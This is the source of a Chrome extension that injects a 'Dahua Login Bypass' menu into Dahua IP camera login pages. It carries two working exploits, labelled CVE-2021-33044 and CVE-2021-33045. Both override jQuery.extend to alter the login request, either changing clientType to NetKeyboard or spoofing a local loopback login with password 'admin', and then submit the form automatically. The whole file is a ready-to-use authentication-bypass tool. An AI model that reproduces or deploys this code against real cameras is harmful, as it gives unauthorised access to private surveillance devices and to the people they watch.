async function loginBypass()
{
	function HtmlAttributeEncode(str)
	{
		let sb = [];
		for (let i = 0; i < str.length; i++)
			switch (str.charAt(i))
			{
				case '"':
					sb.push("&quot;");
					break;
				case '\'':
					sb.push("&#39;");
					break;
				case '&':
					sb.push("&amp;");
					break;
				case '<':
					sb.push("&lt;");
					break;
				case '>':
					sb.push("&gt;");
					break;
				default:
					sb.push(str.charAt(i));
					break;
			}
		return sb.join('');
	}


	let allSelectorSets = [
		{ user: '#login_user', pass: '#login_psw', login: 'a[btn-for="onLogin"]' },
		{ user: '#loginUsername-inputEl', pass: '#loginPassword-inputEl', login: '#loginButton' }
	];
	let pageSelectors = null;
	for (let i = 0; i < allSelectorSets.length; i++)
	{
		let s = allSelectorSets[i];
		if (document.querySelector(s.user) && document.querySelector(s.pass) && document.querySelector(s.login))
		{
			pageSelectors = s;
			break;
		}
	}
	if (!pageSelectors)
	{
		if (!confirm("This page was not identified as a Dahua login page. Run Login Bypass script anyway?"))
			return;
	}

	if (window.bypassLoaded)
	{
		alert('Dahua Login Bypass has already been loaded on this page. Please reload the page if you want to try again.');
		return;
	}
	window.bypassLoaded = true;

	let hackMenu = '<div style="margin-bottom: 10px; font-size: 18px;">Dahua Login Bypass v2 &#10024;</div>';
	hackMenu += '<div style="margin-bottom: 10px;">Try a button. If it does not work, reload the page and try the other button.</div>';
	hackMenu += '<div style="margin-bottom: 10px;">Method 1 should work on most cameras that have not been updated after Sept 2021.</div>';
	hackMenu += '<div style="margin-bottom: 10px;">Method 2 did not work for me in testing but may work for you if firmware is older than beginning/mid 2020.</div>';
	hackMenu += '<div>';

	hackMenu += '<input type="button" id="dlb_method_1" class="u-button fn-width80" value="Method 1" title="CVE-2021-33044" onclick="'
		+ 'if (!window.didAlreadyOverrideExtend) { '
		+ 'window.didAlreadyOverrideExtend = true; '
		+ 'var originalExtend = jQuery.extend; '
		+ 'jQuery.extend = function ()'
		+ '{'
		//+ ' console.log(&quot;extend override&quot;, JSON.stringify(arguments[0]), JSON.stringify(arguments[1]), JSON.stringify(arguments[2]), JSON.stringify(arguments[3]));'
		+ ' if ('
		+ 'arguments.length == 2'
		+ ' && typeof arguments[0].userName !== &quot;undefined&quot;'
		+ ' && arguments[0].password'
		+ ' && arguments[0].clientType === &quot;Web3.0&quot;'
		+ ')'
		+ ' { '
		+ '   let extended = originalExtend.apply(window, arguments);'
		+ '   extended.clientType = &quot;NetKeyboard&quot;;'
		+ '   return extended;'
		+ ' }'
		+ ' else'
		+ ' {'
		+ '   let extended = originalExtend.apply(window, arguments);'
		+ '   return extended;'
		+ ' } '
		+ '}; '
		+ (pageSelectors ? (''
			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.user) + '\').value = &quot;admin&quot;; '
			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.pass) + '\').value = &quot;Not Used&quot;; '
			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.login) + '\').click(); '
			+ 'document.querySelector(\'#dlb_menu\').innerText = \'Bypass Method 1 Enabled\'; '
		) : (''
			+ 'document.querySelector(\'#dlb_menu\').parentNode.removeChild(document.querySelector(\'#dlb_menu\')); '
			+ 'alert(\'Method 1 Enabled. Please attempt to log in now using any fake credentials.\'); '
			+ '')
		)
		+ '}'
		+ '" />';

	hackMenu += '<input type="button" id="dlb_method_2" class="u-button fn-width80" value="Method 2" title="CVE-2021-33045" onclick="'
		+ 'if (!window.didAlreadyOverrideExtend) { '
		+ 'window.didAlreadyOverrideExtend = true; '
		+ 'var originalExtend = jQuery.extend; '
		+ 'jQuery.extend = function ()'
		+ '{'
		+ ' if ('
		+ 'arguments.length == 2'
		+ ' && typeof arguments[0].userName !== &quot;undefined&quot;'
		+ ' && typeof arguments[0].password !== &quot;undefined&quot;'
		+ ' && arguments[0].clientType === &quot;Web3.0&quot;'
		+ ')'
		+ ' { '
		+ ' console.log(&quot;extend override&quot;, JSON.stringify(arguments[0]), JSON.stringify(arguments[1]), JSON.stringify(arguments[2]), JSON.stringify(arguments[3]));'
		+ '   let extended = originalExtend.apply(window, arguments);'
		+ '   extended.ipAddr = &quot;127.0.0.1&quot;;'
		+ '   extended.loginType = &quot;Loopback&quot;;'
		+ '   extended.clientType = &quot;Local&quot;;'
		+ '   extended.passwordType = &quot;Plain&quot;;'
		+ '   extended.password = &quot;admin&quot;;'
		+ '   return extended;'
		+ ' }'
		+ ' else'
		+ ' {'
		+ '   let extended = originalExtend.apply(window, arguments);'
		+ '   return extended;'
		+ ' } '
		+ '}; '
		+ (pageSelectors ? (''
			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.user) + '\').value = &quot;admin&quot;; '
			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.pass) + '\').value = &quot;Not Used&quot;; '
			+ 'document.querySelector(\'' + HtmlAttributeEncode(pageSelectors.login) + '\').click(); '
			+ 'document.querySelector(\'#dlb_menu\').innerText = \'Bypass Method 2 Enabled\'; '
		) : (''
			+ 'document.querySelector(\'#dlb_menu\').parentNode.removeChild(document.querySelector(\'#dlb_menu\')); '
			+ 'alert(\'Method 2 Enabled. Please attempt to log in now using any fake credentials.\'); '
			+ '')
		)
		+ '}'
		+ '" />';

	hackMenu += '</div>';

	let div = document.createElement('div');
	div.id = "dlb_menu";
	div.style.fontSize = '12px';
	div.style.marginTop = '10px';
	div.style.padding = '20px';
	div.style.backgroundColor = '#FFFFFF';
	div.style.border = '3px solid rgba(0,0,0,1)';
	div.style.borderRadius = '8px';
	div.style.boxShadow = '0 0 16px rgb(0 0 0 / 50%)';
	div.style.backdropFilter = 'filter: blur(8px)';
	div.style.position = 'relative';
	div.style.left = '-72px';
	div.innerHTML = hackMenu;
	if (pageSelectors)
		document.querySelector(pageSelectors.login).parentNode.appendChild(div);
	else
	{
		div.style.position = 'absolute';
		div.style.top = '0px';
		div.style.left = '0px';

		document.body.appendChild(div);
	}
}
chrome.action.onClicked.addListener(tab =>
{
	chrome.scripting.executeScript({
		target: { tabId: tab.id },
		function: loginBypass,
	});
});